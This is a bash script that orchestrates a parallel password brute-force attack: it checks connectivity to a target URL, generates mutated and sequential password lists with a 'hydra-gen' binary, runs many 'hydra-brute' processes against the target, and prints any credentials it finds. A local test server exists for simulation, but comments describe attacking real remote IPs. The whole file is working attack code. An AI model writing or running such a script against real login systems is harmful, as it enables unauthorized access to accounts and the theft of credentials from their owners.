#!/bin/bash

# Load configuration
CONFIG_FILE=${1:-.env}
if [ -f "$CONFIG_FILE" ]; then
    echo "📂 Loading configuration from $CONFIG_FILE"
    set -a
    . "$CONFIG_FILE"
    set +a
elif [ "$CONFIG_FILE" != ".env" ]; then
    echo "❌ Error: Config file $CONFIG_FILE not found."
    exit 1
fi

GEN_COUNT=${HYDRA_GEN_COUNT:-1000}
THREAD_COUNT=${HYDRA_THREAD_COUNT:-4}
TEMP_DIR=${HYDRA_TEMP_DIR:-"temp_lists"}
BASE_PASS_FILE=${HYDRA_PASS_FILE:-"passwords.txt"}

# 1. Build
# make build-all

# 2. Session Management
echo "--- 🚀 Hydra Parallel Orchestrator (Multi-Seed Generation) ---"
read -p "♻️  Resume last session? (y/N): " resume
if [[ "$resume" =~ ^[Yy]$ ]]; then
    echo "♻️  Resuming session. Skipping password generation."
    SKIP_GEN=true
else
    echo "🗑️  Starting fresh session."
    rm -rf "$TEMP_DIR"
    mkdir -p "$TEMP_DIR"
    SKIP_GEN=false
fi
LAN_IP=$(hostname -I | awk '{print $1}')
echo "Target: $HYDRA_URL"
echo "Local LAN IP: $LAN_IP"
echo "LAN Access: http://$LAN_IP:8082"

# 3. Connectivity Pre-Check
TARGET_IP=$(echo "$HYDRA_URL" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' || echo "localhost")

# If target is localhost, start the server FIRST so the check passes
if [[ "$TARGET_IP" == "localhost" ]]; then
    if ! lsof -i:8082 > /dev/null; then
        echo "🌐 Starting Local Test Server for simulation..."
        ./bin/testserver > /dev/null 2>&1 &
        SERVER_PID=$!
        sleep 1
        trap "kill $SERVER_PID" EXIT
    fi
fi

echo "🔍 Checking connectivity to $TARGET_IP..."

if [[ "$TARGET_IP" != "localhost" ]]; then
    if ! ping -c 1 -W 2 "$TARGET_IP" > /dev/null; then
        echo "❌ Error: Cannot ping $TARGET_IP. Check your UTP cable and IP settings."
        exit 1
    fi
fi

if ! curl -s -k --connect-timeout 5 "$HYDRA_URL" > /dev/null; then
    echo "⚠️  Warning: URL $HYDRA_URL seems unreachable (No HTTP response)."
    read -p "Continue anyway? (y/n): " cont
    if [ "$cont" != "y" ]; then exit 1; fi
fi

# 4. Read Base Passwords
if [ ! -f "$BASE_PASS_FILE" ]; then
    echo "❌ Error: Base password file $BASE_PASS_FILE not found."
    exit 1
fi

mapfile -t base_seeds < "$BASE_PASS_FILE"
num_seeds=${#base_seeds[@]}

if [ "$num_seeds" -eq 0 ]; then
    echo "❌ Error: No seeds found in $BASE_PASS_FILE."
    exit 1
fi

echo "Found $num_seeds base seeds in $BASE_PASS_FILE."
per_seed=$(( (GEN_COUNT + num_seeds - 1) / num_seeds ))

# 4. Parallel Generation (One thread per seed)
if [ "$SKIP_GEN" = false ]; then
    echo "📦 Phase 1/2: Generating passwords..."
    T1_START=$(date +%s)
    pids_gen=()
    # First, generate combinatorial variations (Seed + Seed)
    echo "🔗 Creating seed combinations..."
    ./bin/hydra-gen -n 1000 -simfile "$BASE_PASS_FILE" -combine > "$TEMP_DIR/part_combo.txt" 2>/dev/null &
    pids_gen+=($!)

    for i in "${!base_seeds[@]}"; do
        seed="${base_seeds[$i]}"
        ./bin/hydra-gen -n "$per_seed" -simpass "$seed" -simfile "" -mutate > "$TEMP_DIR/part_$(printf "%02d" $i).txt" 2> /dev/null &
        pids_gen+=($!)
    done

    # Monitor Generation Progress
    while true; do
        still_running=0
        for pid in "${pids_gen[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then ((still_running++)); fi
        done
        
        current_count=$(cat "$TEMP_DIR"/part_*.txt 2>/dev/null | wc -l)
        percent=$(( current_count * 100 / GEN_COUNT ))
        if [ "$percent" -gt 100 ]; then percent=100; fi
        
        # Shortened Progress bar (30 chars) to fit narrow terminals
        bar_len=$((percent * 30 / 100))
        bar=$(printf "%${bar_len}s" | tr " " "#")
        printf "\r\033[K   > Progress: [%-30s] %d%% (%d/%d)" "$bar" "$percent" "$current_count" "$GEN_COUNT"
        
        if [ "$still_running" -eq 0 ]; then break; fi
        sleep 0.5
    done
    T1_END=$(date +%s)
    T1_DUR=$(( T1_END - T1_START ))
    echo -e "\n✅ Generation Complete. (Duration: ${T1_DUR}s)"
else
    echo "⏩ Skipping Phase 1 (Reusable wordlists found)."
fi

# 5. Start Test Server (if target is NOT localhost but we want it anyway, or if failed to start earlier)
if [[ "$TARGET_IP" != "localhost" ]] && ! lsof -i:8082 > /dev/null; then
    # Usually we don't start the test server if attacking a real IP, 
    # but we keep this here as a fallback or for local alias testing.
    echo "🌐 Note: Local test server not started (Target is remote)."
fi

# 6. Launch Parallel Brute Force
TOTAL_FOR_BRUTE=$(cat "$TEMP_DIR"/part_*.txt 2>/dev/null | wc -l)
echo "🔥 Phase 2/2: Launching brute force ($TOTAL_FOR_BRUTE passwords)..."
T2_START=$(date +%s)

pids_brute=()
for f in "$TEMP_DIR"/part_*.txt; do
    if [ -f "$f" ]; then
        ./bin/hydra-brute "$f" > "${f%.txt}.log" 2>&1 &
        pids_brute+=($!)
    fi
done

# 7. Monitor Brute Force Progress
success_file=""
while true; do
    still_running=0
    for pid in "${pids_brute[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then ((still_running++)); fi
    done
    
    # Check for success
    found_log=$(grep -l "SUCCESS" "$TEMP_DIR"/*.log 2>/dev/null | head -n 1)
    if [ -n "$found_log" ]; then
        success_file="$found_log"
        # Kill all remaining brute force processes
        for pid in "${pids_brute[@]}"; do
            kill "$pid" 2>/dev/null
        done
        break
    fi

    tested_count=$(grep -c "Testing:" "$TEMP_DIR"/*.log 2>/dev/null | awk -F":" "{sum+=\$2} END {print sum+0}")
    if [ "$TOTAL_FOR_BRUTE" -gt 0 ]; then
        percent=$(( tested_count * 100 / TOTAL_FOR_BRUTE ))
    else
        percent=0
    fi
    if [ "$percent" -gt 100 ]; then percent=100; fi
    
    # Shortened Progress bar (30 chars) to fit narrow terminals
    bar_len=$((percent * 30 / 100))
    bar=$(printf "%${bar_len}s" | tr " " "#")
    printf "\r\033[K   > Progress: [%-30s] %d%% (%d/%d)" "$bar" "$percent" "$tested_count" "$TOTAL_FOR_BRUTE"
    
    if [ "$still_running" -eq 0 ]; then break; fi
    sleep 1
done
T2_END=$(date +%s)
T2_DUR=$(( T2_END - T2_START ))
echo -e "\n✅ Brute Force Phase Complete. (Duration: ${T2_DUR}s)"

echo -e "\n----------------------------------------"
echo "✅ Parallel Scan Complete."

# 8. Success Report or Fallback
if [ -n "$success_file" ]; then
    echo "🎯 FOUND SUCCESS!"
    success_line=$(grep "SUCCESS" "$success_file" | head -n 1)
    creds=$(echo "$success_line" | awk -F"Testing: " "{print \$2}" | awk -F" " "{print \$1}")
    echo "👤 User/Pass: $creds"
    grep -h "Response:" "$success_file"
    exit 0
else
    if grep -r "SUCCESS" "$TEMP_DIR"/*.log > /dev/null; then
         echo "🎯 FOUND SUCCESS!"
         grep -h -B 1 "SUCCESS" "$TEMP_DIR"/*.log
         exit 0
    fi

    echo -e "\n❌ Stage 1 (Mutation Search) failed to find credentials."
    read -p "🚀 Would you like to start Phase 2 (Radical 'From Scratch' Search)? (y/n): " start_phase2
    if [ "$start_phase2" != "y" ]; then
        echo "Exiting."
        exit 0
    fi

    echo "--- 🔥 Phase 2: Radical 'From Scratch' Search ---"
    T3_START=$(date +%s)
    rm -rf "$TEMP_DIR"
    mkdir -p "$TEMP_DIR"
    
    # For sequential, we use a much larger count if needed, or double GEN_COUNT
    PHASE2_COUNT=$(( GEN_COUNT * 2 ))
    echo "📦 Generating $PHASE2_COUNT unique passwords sequentially from scratch (Exhaustive)..."
    
    ./bin/hydra-gen -n "$PHASE2_COUNT" -sequential > "$TEMP_DIR/scratch_master.txt"
    
    # Split for parallel brute force
    split -n "l/$THREAD_COUNT" "$TEMP_DIR/scratch_master.txt" "$TEMP_DIR/part_"
    # Rename to .txt for the loop
    for f in "$TEMP_DIR"/part_*; do mv "$f" "$f.txt"; done

    echo "🔥 Launching broad brute force..."
    pids_brute=()
    for f in "$TEMP_DIR"/part_*.txt; do
        ./bin/hydra-brute "$f" > "${f%.txt}.log" 2>&1 &
        pids_brute+=($!)
    done

    # Monitor Phase 2
    while true; do
        still_running=0
        for pid in "${pids_brute[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then ((still_running++)); fi
        done
        
        # Early exit on success
        found_log=$(grep -l "SUCCESS" "$TEMP_DIR"/*.log 2>/dev/null | head -n 1)
        if [ -n "$found_log" ]; then
            for pid in "${pids_brute[@]}"; do kill "$pid" 2>/dev/null; done
            T3_END=$(date +%s)
            T3_DUR=$(( T3_END - T3_START ))
            echo -e "\n🎯 FOUND SUCCESS IN PHASE 2! (Duration: ${T3_DUR}s)"
            grep -h -B 1 "SUCCESS" "$found_log"
            exit 0
        fi

        tested_count=$(grep -c "Testing:" "$TEMP_DIR"/*.log 2>/dev/null | awk -F":" "{sum+=\$2} END {print sum+0}")
        printf "\r\033[K   > Progress: %d/%d" "$tested_count" "$PHASE2_COUNT"
        
        if [ "$still_running" -eq 0 ]; then break; fi
        sleep 1
    done
    T3_END=$(date +%s)
    T3_DUR=$(( T3_END - T3_START ))
    echo -e "\n❌ Phase 2 complete. No credentials found. (Duration: ${T3_DUR}s)"
fi
